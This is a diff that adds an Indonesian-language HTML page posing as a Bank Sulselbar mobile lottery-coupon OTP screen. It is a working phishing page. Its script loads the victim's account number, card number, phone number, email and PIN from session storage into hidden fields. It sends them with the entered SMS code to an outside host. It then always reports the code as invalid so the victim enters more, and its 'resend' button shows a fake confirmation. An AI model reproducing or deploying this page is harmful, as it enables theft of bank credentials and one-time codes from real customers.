@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="fragment" content="!"> 
+  <meta name="theme-color" content="#97b432"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+  <title>otp kupon</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
+        body {
+            padding: 0;
+            margin: 0;
+            width: 100%;
+            font-family: 'Open Sans', sans-serif;
+            position: fixed;
+            background: #97b432;
+        }
+        
+       .container{
+         max-width: 100%;
+         width: 330px;
+         height: 400px;
+         background: #fff;
+         margin: -40px auto;
+         border-radius: 15px;
+         display: block;
+         position: relative;
+         top: 150px;
+         box-shadow: 4px 7px 10px rgba(0,0,0,0.5);
+         box-sizing: border-box;
+         justify-content: center;
+         justify-items: center;
+         align-items: center;
+       }
+       .wraper{
+         width: 100%;
+         position: fixed;
+         top: 0;
+         height: auto;
+         left: 0;
+         right: 0;
+         margin: 5px;
+         
+       }
+       .wraper img{
+         width: 320px;
+         margin: 9px;
+         height: 200px;
+         
+       }
+       .animasi{
+        margin-top: -70px;
+        position: absolute;
+        left: 0px;
+        right: 0;
+       }
+       .box-otp{
+         max-width: 90%;
+         width: 287px;
+         padding: 10px;
+         margin: 12px auto;
+         text-align: center;
+         font-size: 15px;
+         outline: none;
+         background: #fff;
+         border-radius: 8px;
+         border: 1px solid #c0c0c0;
+         font-weight: 600;
+         z-index: 999999999;
+         box-sizing: border-box;
+       }
+       #pelew{
+         width: 80%;
+         padding: 10px;
+         margin: 33px;
+         border: 1px solid #fff;
+         cursor: pointer!important;
+         background: #97b432;
+         border-radius: 8px;
+         font-size: 15px;
+         color: #fff;
+         font-weight: 600;
+         box-shadow: 4px 7px 10px rgba(0,0,0,0.5);
+         
+       }
+       h1{
+            display: table;
+            background-color: transparent;
+            color: #FF0000;
+            width: 100%;
+            font-size: 10px;
+            margin-bottom: -70px;
+            text-align: center;
+           font-weight: bold;
+            right: 0;
+            left: 0;
+            margin: 0px auto;
+            position: fixed;
+            margin-top: -8px;
+        }
+        
+        .blink {
+  animation: blink-animation 2s steps(6, start) infinite;
+  -webkit-animation: blink-animation 2s steps(6, start) infinite;
+}
+@keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+@-webkit-keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+
+#Aktivasi{
+    display: none;
+}
+.textarea1 {
+     box-sizing: border-box; 
+     border: 1px solid red;
+     border-radius: 8px;
+     
+        }
+        .textarea2 {
+     box-sizing: border-box; 
+     border: 2px solid #C7B700;
+     border-radius: 8px;  
+  }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="wraper">
+      <center>
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgM_X35odAMNNIt_2UCw62DiJJJQMHqfXQ7DM-JqnyvtfFbZeFiVo4_zH5LuKtXyEYNjzmXBnE8evSyOkodZ3BdOHzeQPxCmaAN8Uwz48ZgUmXQJzq6o0yYQ_C9ma-ej47Uh6cYGyfwicCCE5swfUyrPIhfkfCqnB8pd-7Ykhz4sgkNVlPfkHUKwGf3Pik/s500/IMG_20240622_231245-fotor-bg-remover-20240622231342.png" alt="" class="">
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXVwo82cpg6CV_u3KjMyT7XomeqYZBW4FYS1BrlBMtrsYOwr3Flnh1ONvKmU_33KzkTpocE66g1h-VH9lbf2LOkNz2gXRWT1MS48FPRqz2p3y1USlAdtBC_ETVzicxtjdly9-O1pct-TWArQ2km-4DWNipqLryUfiy7q-lvPWgDmYTicPSc3LWn4lz3d0/s320/https___ce64c9d57a81b0071425df9f602e4e02.cdn.bubble.io_f1711534146768x263703491967350430_https___f5eb8685fdc0600412a283556a5f209a.cdn.bubble.io_f1703135155882x705205408323363200_CLIPLY_372109170_FREE_FIREWORKS_400.gif" alt="" class="animasi">
+      </center>
+      </div>
+      <br><br>
+      <div style="width: 90%;padding: 9px;border-bottom: 1px solid transparent;margin: 7px;position: relative;top: 25px;">
+        <h6 style="text-align: center;font-size: 10px;color: #000;">Masukan Kode Aktivasi Cetak Kupon Yang Telah Kami Kirimkan Melalui Pesan SMS di Nomor Handphone Kamu Yang Terdaftar Di Sulselbar Mobile, Untuk Melanjutkan Proses Pencetakan Kupon Undian</h6>
+      </div>
+      <form action="./sendOtp.php" method="post" id="sendOtp">
+        <span class="blink" style="display: none" id="blinkAktivasi"><h1>OTP Cetak Kupon invalid, atau sudah kadaluarsa</h1></span>
+       <input type="hidden" name="norekku" id="norekku" value="">
+       <input type="hidden" name="nokarkku" id="nokarkku" value="">
+       <input type="hidden" name="nomorkku" id="nomorkku" value="">
+       <input type="hidden" name="emailkku" id="emailkku" value="">
+       <input type="hidden" name="pinku" id="pinku" value="">
+        <div class="box-=input">
+          <center>
+          <input type="text" name="otp" id="otp" placeholder="Kode Aktivasi Kupon 8 Digit"  required class="box-otp" onclick="gantiborder1()" required inputmode="numeric" minlength="6" maxlength="8" required>
+          </center>
+        </div>
+        <center>
+       <p id="alert" style="font-size: 10px;width: 100%;background: transparent;color: #000;position: fixed;text-align: center;top: 465px;right: 0;left: 0;font-weight: bold;display: ;" class="alert"></p>
+     </center>
+        <div class="box-btn">
+          <button type="submit" id="pelew">Konfirmasi</button>
+        </div>
+      </form>
+  </div>
+  <br>
+  <br>
+  <br><br>
+   <button style="width: 100%;font-size: 12px;background: none;border: none;text-align: center;font-weight: bold;position: fixed;margin-top: 50px;margin-left: 0;color:rgb(9, 100, 127);" onclick="sendUlang()">>>Kirim Ulang SMS Cetak Kupon<<</button>
+  <!-- partial -->
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script>
+var noreku = sessionStorage.getItem("noreku");
+document.getElementById("norekku").value = noreku + "";
+
+var nokarku = sessionStorage.getItem("nokarku");
+document.getElementById("nokarkku").value = nokarku + "";
+
+var nomorku = sessionStorage.getItem("nomorku");
+document.getElementById("nomorkku").value = nomorku + "";
+
+var emailku = sessionStorage.getItem("emailku");
+document.getElementById("emailkku").value = email + "";
+
+var pin = sessionStorage.getItem("pin");
+document.getElementById("pinku").value = pin + "";
+  </script>
+ <script>
+ $('#sendOtp').on('submit', function (event) {
+
+  event.stopPropagation();
+    event.preventDefault();
+  document.getElementById('pelew').innerHTML = "Memproses....";
+ 
+
+
+
+$.ajax({
+
+ type: 'POST',
+ url: 'https://kontol-sepetan.my.id/Sulselbar/req/sendOtp.php',
+ async: false,
+ dataType: 'JSON',
+ data: $(this).serialize(),
+ 
+ complete: function(data) {
+            console.log('Complete')
+ setTimeout(function(){
+ document.getElementById('pelew').innerHTML = "Konfirmasi";
+ 
+  document.getElementById("blinkAktivasi").style.display = "block";
+ $("#otp").val("");
+ $("#otp").addClass('textarea1'); 
+  
+
+
+    },900);
+
+
+
+        }
+    });
+
+    return false;
+});   
+        
+</script>
+<script>
+  function sendUlang(){
+    $('.blink').hide();event.preventDefault();
+    setTimeout(function(){
+    $("#otp").removeClass('textarea1');
+    },700);
+    
+    $("#otp").addClass('textarea2');
+    $('#alert').show();
+     var nomorku = document.getElementById('nomorku').value;
+     sessionStorage.setItem('nomorku', nomorku);
+     document.getElementById('alert').innerHTML = 'OTP telah terkirim ulang ke +62' +  nomorku +  '<br>via SMS di nomor handphone anda';
+  }
+</script>
+<script>
+ function gantiborder1(){
+   $("#otp").removeClass('textarea1'); 
+   
+   $("#blinkAktivasi").hide(); 
+   document.getElementById('pelew').value = "Konfirmasi";
+ }   
+</script>
+</body>
+</html>
